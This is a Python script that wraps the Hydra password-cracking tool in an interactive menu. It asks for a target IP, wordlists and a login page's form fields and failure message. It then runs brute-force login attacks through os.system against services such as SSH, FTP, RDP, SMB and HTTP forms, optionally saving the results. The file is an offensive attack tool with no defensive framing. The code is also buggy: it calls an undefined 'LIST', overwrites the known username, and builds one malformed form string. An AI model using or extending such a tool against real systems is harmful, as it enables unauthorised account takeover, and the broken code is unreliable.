import os
import sys
from termcolor import colored
import time
import socket


def dra():
	save = input('Save File Results <y/n>:\n> ')

	if save == 'n':
		plan = '''

[p]assword known, but not the username
[u]sername known, but password is not
[n]othing known

		'''
		print(colored(plan, 'yellow'))
		choice = input('> ')
		if choice == 'n':
			list = '''

[smtp]
[ftp]
[ssh]
[http]
[https]
[cvs]
[http-get]
[http-post]
[http-head]
[http-get-form]
*[http-post-form]
[https-get]
[https-get-form]
[https-post]
*[https-post-form]
[irc]
[imap]
[ldap2]
[ldap3]
[mssql]
[mysql]
[pop3]
[postgres]
[rdp]
[rlogin]

* Indicates they are reliable
		'''
			IP = input('What Is The IP Address Of Your Target:\n> ')
			targList = input('Path/To/Username/Wordlist.txt:\n> ')
			wordlist = input('Path/To/Password/Wordlist.txt:\n> ')

			user = input('Upon Inspecting Website Page, What Does The Site Label The Username:\n> ')
			Pass = input('Upon Inspecting Website Page, What Does The Site Label The Password:\n> ')
			fail = input('What Is The Message That Pops Up When The Incorrect Credentials Have Been Entered:\n> ')
			layout = f'"/:{user}=^USER^&{Pass}=^PASS^:F={fail}"'

			print(list)
			select = input('\n> ')
			hydra1 = 'hydra -L ' + targList + ' -P ' + wordlist + ' ' + IP + ' ' + select + ' ' + layout + ' -V'
			gt = 'gnome-terminal -x ' + hydra1
			os.system(gt)

		elif choice == 'u':
			IP = input('What Is The IP Address Of Your Target:\n ')
			user = input('What Is The Known Username:\n> ')
			wordlist = input('Provide/Path/To/Wordlist.txt:\n> ')

			user = input('Upon Inspecting Website Page, What Does The Site Label The Username:\n> ')
			Pass = input('Upon Inspecting Website Page, What Does The Site Label The Password:\n> ')
			fail = input('What Is The Message That Pops Up When The Incorrect Credentials Have Been Entered:\n> ')
			layout = f'"/:{user}=^USER^&{Pass}=^PASS^:F={fail}"'

			print(LIST)
			select = input('> ')
			hydra2 = 'hydra -l ' + user + ' -P ' + wordlist + ' ' + IP + ' ' + select + ' ' + layout + ' -V'
			gt2 = 'gnome-terminal -x ' + hydra2
			os.system(gt2)

		elif choice == 'p':
			IP = input('What Is The IP Address Of Your Target:\n> ')
			targList = input('Path/To/Username/Wordlist.txt:\n> ')
			psswrd = input('What Is The Known Password:\n> ')

			user = input('Upon Inspecting Website Page, What Does The Site Label The Username:\n> ')
			Pass = input('Upon Inspecting Website Page, What Does The Site Label The Password:\n> ')
			fail = input('What Is The Message That Pops Up When The Incorrect Credentials Have Been Entered:\n> ')
			layout = f'"/:{user}=^USER^&{Pass}=^PASS^:F={fail}"'

			print(list)
			select = input('> ')
			hydra3 = 'hydra -L ' + targList + ' -p ' + psswrd + ' ' + IP + ' ' + select + ' ' + layout + ' -V'
			gt3 = 'gnome-terminal -x ' + hydra3
			os.system(gt3)
		else:
			print('Invalid Input')

	elif save == 'y':

		plan = '''

[p]assword known, but not the username
[u]sername known, but password is not
[n]othing known

		'''
		print(colored(plan, 'yellow'))
		choice = input('> ')
		if choice == 'n':
			list = '''

[smtp]
[ftp]
[ssh]
[http]
[https]
[cvs]
[http-get]
[http-post]
[http-head]
[http-get-form]
[http-post-form]
[https-get]
[https-get-form]
[https-post]
[https-post-form]
[irc]
[imap]
[ldap2]
[ldap3]
[mssql]
[mysql]
[pop3]
[postgres]
[rdp]
[rlogin]
[rexec]
[sntp]
[socks5]
[smb2]
[sshkey]
[telnet]
[vnc]
[sip]
[svn]

		'''
			IP = input('What Is The IP Address Of Your Target:\n ')
			targList = input('Path/To/Username/Wordlist.txt:\n> ')
			port = input('What Port Are You Specifying:\n> ')
			wordlist = input('Provide/Path/To/Wordlist.txt:\n> ')

			user = input('Upon Inspecting Website Page, What Does The Site Label The Username:\n> ')
			Pass = input('Upon Inspecting Website Page, What Does The Site Label The Password:\n> ')
			fail = input('What Is The Message That Pops Up When The Incorrect Credentials Have Been Entered:\n> ')
			layout = f'":/{user}=^USER^&{Pass}=^PASS^:F={fail}"'

			filename = input('Give Saved File A Name:\n> ')
			print(list)
			select = input('> ')
			hydra1 = 'hydra -L ' + targList + ' -P ' + wordlist + ' ' + IP + ' ' + select + ' -o ' + filename + ' ' + layout + ' -V'
			gt = 'gnome-terminal -x ' + hydra1
			os.system(gt)

		elif choice == 'u':
			IP = input('What Is The IP Address Of Your Target:\n> ')
			user = input('What Is The Known Username:\n> ')
			wordlist = input('Provide/Path/To/Wordlist.txt:\n> ')

			user = input('Upon Inspecting Website Page, What Does The Site Label The Username:\n> ')
			Pass = input('Upon Inspecting Website Page, What Does The Site Label The Password:\n> ')
			fail = input('What Is The Message That Pops Up When The Incorrect Credentials Have Been Entered:\n> ')
			layout = f'"/:{user}=^USER^&{Pass}=^PASS^:F={fail}"'

			filename = input('Give Saved File A Name:\n> ')
			print(LIST)
			select = input('> ')
			hydra2 = 'hydra -l ' + user + ' -P ' + wordlist + ' ' + IP + ' ' + select + ' -o ' + filename + ' ' + layout + ' -V'
			gt2 = 'gnome-terminal -x ' + hydra2
			os.system(gt2)

		elif choice == 'p':
			IP = input('What Is The IP Address Of Your Target:\n> ')
			targList = input('Path/To/Username/Wordlist.txt:\n> ')
			psswrd = input('What Is The Known Password:\n> ')
			filename = input('Give Saved File A Name:\n> ')

			user = input('Upon Inspecting Website Page, What Does The Site Label The Username:\n> ')
			Pass = input('Upon Inspecting Website Page, What Does The Site Label The Password:\n> ')
			fail = input('What Is The Message That Pops Up When The Incorrect Credentials Have Been Entered:\n> ')
			layout = f'"/:{user}=^USER^&{Pass}=^PASS^:F={fail}"'

			print(list)
			select = input('> ')
			hydra3 = 'hydra -L ' + targList + ' -p ' + psswrd + ' ' + IP + ' ' + select + ' -o ' + filename + ' ' + layout + ' -V'
			gt3 = 'gnome-terminal -x ' + hydra3
			os.system(gt3)

		else:
			print('Invalid Input')

	else:
		print('Invalid Input')



